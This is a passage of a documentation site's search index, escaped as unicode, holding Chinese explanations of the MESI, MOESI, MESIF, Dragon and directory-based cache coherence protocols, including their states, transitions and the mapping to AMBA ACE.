\u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b Modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u4fee\u6539\u200b\u6570\u636e\u200b\uff0c\u200b\u72b6\u6001\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b\u3002</p> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Modified/Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u5e76\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u4fee\u6539\u200b\u672c\u5730\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\u90fd\u200b\u662f\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u5165\u200b\uff0c\u200b\u7136\u540e\u200b\u4fee\u6539\u200b\u7f13\u5b58\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#mesi","title":"MESI \u200b\u534f\u8bae","text":"<p>MESI \u200b\u534f\u8bae\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u56db\u79cd\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u6570\u636e\u200b\u4e0e\u200b\u5185\u5b58\u200b\u4e0d\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u6570\u636e\u200b</li> <li>Exclusive\uff1a\u200b\u6570\u636e\u200b\u4e0e\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u6570\u636e\u200b</li> <li>Shared\uff1a\u200b\u6570\u636e\u200b\u4e0e\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u540c\u65f6\u200b\u6709\u200b\u6570\u636e\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> </ol> <p>\u200b\u5f53\u200b Read hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u3002</p> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u4f1a\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u90fd\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\uff1b\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u5165\u200b Exclusive \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u540c\u65f6\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u5426\u5219\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u200b\u3002\u200b\u7136\u540e\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u672c\u5730\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u503c\u5f97\u4e00\u63d0\u7684\u662f\u200b\uff0cShared \u200b\u72b6\u6001\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u8868\u793a\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u6570\u636e\u200b\uff1a\u200b\u6bd4\u5982\u200b\u672c\u6765\u200b\u6709\u200b\u4e24\u4e2a\u200b\u7f13\u5b58\u200b\u90fd\u200b\u662f\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u56e0\u4e3a\u200b\u7f13\u5b58\u200b\u66ff\u6362\u200b\u53d8\u6210\u200b\u4e86\u200b Invalid\uff0c\u200b\u90a3\u4e48\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u662f\u200b\u4e0d\u4f1a\u200b\u53d7\u5230\u200b\u901a\u77e5\u200b\u53d8\u6210\u200b Exclusive \u200b\u7684\u200b\u3002Exclusive \u200b\u7684\u200b\u8bbe\u7f6e\u200b\u662f\u200b\u4e3a\u4e86\u200b\u51cf\u5c11\u200b\u4e00\u4e9b\u200b\u603b\u7ebf\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5f53\u200b\u6570\u636e\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u6838\u5fc3\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u6709\u200b\u7b2c\u4e00\u6b21\u200b Read miss \u200b\u4f1a\u200b\u53d1\u9001\u200b\u603b\u7ebf\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4e4b\u540e\u200b\u4e00\u76f4\u200b\u5728\u200b Exclusive/Modified \u200b\u72b6\u6001\u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u53d1\u9001\u200b\u603b\u7ebf\u200b\u8bf7\u6c42\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#moesi","title":"MOESI \u200b\u534f\u8bae","text":"<p>MOESI \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e94\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u6570\u636e\u200b\u7ecf\u8fc7\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Owned\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ea\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>Exclusive\uff1a\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Shared\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> </ol> <p>\u200b\u72b6\u6001\u200b\u4e2d\u200b\uff0cM \u200b\u548c\u200b E \u200b\u662f\u200b\u72ec\u5360\u200b\u7684\u200b\uff0c\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\u91cc\u200b\u53ea\u80fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b S\uff0c\u200b\u6216\u8005\u200b\u591a\u4e2a\u200b S \u200b\u52a0\u200b\u4e00\u4e2a\u200b O\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b O\u3002</p> <p>\u200b\u5b83\u200b\u7684\u200b\u72b6\u6001\u200b\u8f6c\u79fb\u200b\u4e0e\u200b MESI \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff1a\u200b\u5f53\u200b\u6838\u5fc3\u200b\u5199\u5165\u200b Owned \u200b\u72b6\u6001\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u200b\uff0c\u200b\u6709\u200b\u4e24\u79cd\u200b\u65b9\u5f0f\u200b\uff1a1\uff09\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b Shared \u200b\u7684\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff1b2\uff09\u200b\u628a\u200b\u5176\u4ed6\u200b Shared \u200b\u7f13\u5b58\u200b\u8bbe\u200b\u4e3a\u200b Invalid\uff0c\u200b\u7136\u540e\u200b\u672c\u5730\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Modified \u200b\u72b6\u6001\u200b\u3002\u200b\u5728\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u4ece\u200b Owned \u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u800c\u200b\u4e0d\u7528\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u3002\u200b\u5b83\u200b\u76f8\u6bd4\u200b MESI \u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5199\u200b\u56de\u200b\u5185\u5b58\u200b\u7684\u200b\u6b21\u6570\u200b\u3002</p> <p>AMD64 \u200b\u6587\u6863\u200b\u91cc\u200b\u91c7\u7528\u200b\u7684\u200b\u5c31\u662f\u200b MOESI \u200b\u534f\u8bae\u200b\u3002AMBA ACE \u200b\u534f\u8bae\u200b\u5176\u5b9e\u200b\u4e5f\u200b\u662f\u200b MOESI \u200b\u534f\u8bae\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u6362\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u540d\u79f0\u200b\uff0c\u200b\u8868\u793a\u200b\u53ef\u4ee5\u200b\u517c\u5bb9\u200b MEI/MESI/MOESI \u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u534f\u8bae\u200b\u3002ACE \u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>UniqueDirty: Modified</li> <li>SharedDirty: Owned</li> <li>UniqueClean: Exclusive</li> <li>SharedClean: Shared</li> <li>Invalid: Invalid</li> </ol> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cSharedClean \u200b\u5e76\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u5b83\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u6bd4\u5982\u8bf4\u200b\u548c\u200b SharedDirty \u200b\u7f13\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5b83\u200b\u53ea\u662f\u200b\u8bf4\u200b\u7f13\u5b58\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5199\u56de\u200b\u5185\u5b58\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#mesif","title":"MESIF \u200b\u534f\u8bae","text":"<p>MESIF \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e94\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u6570\u636e\u200b\u7ecf\u8fc7\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Exclusive\uff1a\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b</li> <li>Shared\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> <li>Forward\uff1a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u4fee\u6539\u200b\u6570\u636e\u200b\uff0c\u200b\u4e14\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u8d1f\u8d23\u200b\u54cd\u5e94\u200b\u8bf7\u6c42\u200b</li> </ol> <p>MESIF \u200b\u76f8\u6bd4\u200b MESI \u200b\u7684\u200b\u533a\u522b\u200b\u662f\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u4e86\u200b Forward \u200b\u72b6\u6001\u200b\uff1aForward \u200b\u5176\u5b9e\u200b\u662f\u200b\u7279\u6b8a\u200b\u7684\u200b Shared\uff0c\u200b\u4e3b\u8981\u200b\u662f\u200b\u8003\u8651\u200b\u5230\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Shared \u200b\u72b6\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u6765\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u90a3\u4e48\u200b\u54ea\u4e2a\u200b Shared \u200b\u7f13\u5b58\u200b\u8d1f\u8d23\u200b\u54cd\u5e94\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u3002MESIF \u200b\u534f\u8bae\u200b\u4e2d\u200b\uff0cForward \u200b\u5c31\u662f\u200b\u8d1f\u8d23\u200b\u54cd\u5e94\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b Shared\uff0c\u200b\u6240\u4ee5\u200b Forward \u200b\u6700\u200b\u591a\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u5176\u4ed6\u200b Shared \u200b\u90fd\u200b\u4e0d\u4f1a\u200b\u54cd\u5e94\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u7b80\u5316\u200b\u4e86\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u591a\u4e2a\u200b Cache \u200b\u5c5e\u4e8e\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u6ca1\u6709\u200b Forward\uff0c\u200b\u90a3\u4e48\u200b\u65b0\u200b\u7684\u200b Cache \u200b\u8bf7\u6c42\u200b\u5c31\u200b\u4f1a\u200b\u53d1\u9001\u5230\u200b\u5185\u5b58\u200b\u91cc\u200b\uff0c\u200b\u7531\u4e8e\u200b Shared \u200b\u7684\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u7ecf\u8fc7\u200b\u4fee\u6539\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b Shared \u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65b0\u200b\u7684\u200b Cache \u200b\u4f1a\u200b\u8fdb\u5165\u200b Forward \u200b\u72b6\u6001\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#dragon","title":"Dragon \u200b\u534f\u8bae","text":"<p>Dragon \u200b\u534f\u8bae\u200b\u662f\u200b\u4e00\u4e2a\u200b\u57fa\u4e8e\u200b\u66f4\u65b0\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u610f\u5473\u7740\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u628a\u200b\u66f4\u65b0\u200b\u7684\u200b\u6570\u636e\u200b\u540c\u6b65\u200b\u5230\u200b\u62e5\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u5176\u4ed6\u200b\u6838\u5fc3\u200b\u3002\u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u56db\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Exclusive clean(E)\uff1a\u200b\u72ec\u5360\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b</li> <li>Shared clean(Sc)\uff1a\u200b\u6570\u636e\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u81ea\u5df1\u200b\u4e0d\u662f\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5199\u5165\u200b\u8be5\u200b\u7f13\u5b58\u6570\u636e\u200b\u7684\u200b</li> <li>Shared modified(Sm)\uff1a\u200b\u6570\u636e\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u81ea\u5df1\u200b\u8bbe\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5199\u5165\u200b\u8be5\u200b\u7f13\u5b58\u6570\u636e\u200b\u7684\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u524d\u9762\u200b MOESI \u200b\u534f\u8bae\u200b\u7684\u200b Owner \u200b\u72b6\u6001\u200b</li> <li>Modify(M)\uff1a\u200b\u72ec\u5360\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e0d\u200b\u4e00\u81f4\u200b</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cE \u200b\u548c\u200b M \u200b\u90fd\u200b\u662f\u200b\u72ec\u5360\u200b\u7684\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u6709\u200b\u540c\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b\u82e5\u5e72\u4e2a\u200b Sc \u200b\u548c\u200b\u4e00\u4e2a\u200b Sm\u3002</p> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u68c0\u67e5\u200b\u662f\u5426\u200b\u6709\u200b\u7f13\u5b58\u200b\u5df2\u7ecf\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\uff0c\u200b\u5219\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u200b\u5e76\u200b\u8f6c\u5230\u200b Exclusive clean \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b\u5728\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u5219\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u5c06\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u8f6c\u79fb\u200b\u5230\u200b Shared clean/Shared modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u8be5\u200b\u7f13\u5b58\u200b\u8f6c\u79fb\u200b\u5230\u200b Shared clean \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u540c\u6837\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u7b2c\u4e00\u4e2a\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u8f6c\u200b\u5230\u200b Modify \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u4e0d\u662f\u200b\u7b2c\u4e00\u4e2a\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff0c\u200b\u5c31\u200b\u8fdb\u5165\u200b Shared modified \u200b\u72b6\u6001\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8ba9\u200b\u539f\u6765\u200b Shared modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Shared clean \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u72b6\u6001\u200b\u662f\u200b Shared modified\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u9700\u8981\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\uff1b\u200b\u5982\u679c\u200b\u72b6\u6001\u200b\u662f\u200b Shared clean\uff0c\u200b\u5219\u200b\u8981\u200b\u901a\u77e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u66f4\u65b0\u200b\u6570\u636e\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u8ba9\u200b\u539f\u6765\u200b Shared modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Shared clean \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u72b6\u6001\u200b\u662f\u200b Exclusive clean\uff0c\u200b\u5219\u200b\u8fdb\u5165\u200b Modify \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff0cShared modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u8d1f\u8d23\u200b\u5728\u200b\u6362\u200b\u51fa\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_3","title":"\u57fa\u4e8e\u200b\u76ee\u5f55\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u6709\u200b\u8fd9\u4e48\u200b\u4e00\u4e2a\u200b\u64cd\u4f5c\u200b\uff1a\u200b\u5411\u200b\u6240\u6709\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u7f13\u5b58\u200b\u53d1\u9001\u200b/\u200b\u63a5\u53d7\u200b\u6d88\u606f\u200b\u3002\u200b\u7b80\u5355\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u76f4\u63a5\u200b\u5e7f\u64ad\u200b\uff0c\u200b\u7136\u540e\u200b\u63a5\u53d7\u200b\u7aef\u200b\u81ea\u5df1\u200b\u5224\u65ad\u200b\u662f\u5426\u200b\u5904\u7406\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u5728\u200b\u6838\u5fc3\u200b\u5f88\u591a\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5e7f\u64ad\u200b\u6d41\u91cf\u200b\u592a\u200b\u5927\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5148\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\u54ea\u4e9b\u200b\u7f13\u5b58\u200b\u4f1a\u200b\u6709\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7136\u540e\u200b\u5bf9\u200b\u8fd9\u4e9b\u200b\u7f13\u5b58\u200b\u70b9\u5bf9\u70b9\u200b\u5730\u200b\u53d1\u9001\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8282\u7701\u200b\u4e00\u4e9b\u200b\u7f51\u7edc\u6d41\u91cf\u200b\u3002</p> <p>\u200b\u600e\u4e48\u200b\u8bb0\u5f55\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\u5462\u200b\uff1f\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u529e\u6cd5\u200b\uff08Full bit vector format\uff09\u200b\u662f\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5168\u5c40\u200b\u7684\u200b\u8868\u200b\uff0c\u200b\u5bf9\u200b\u6bcf\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u90fd\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b\u5927\u5c0f\u200b\u4e3a\u200b N\uff08N \u200b\u4e3a\u200b\u6838\u5fc3\u200b\u6570\u200b\uff09\u200b\u7684\u200b\u4f4d\u200b\u5411\u91cf\u200b\uff0c1 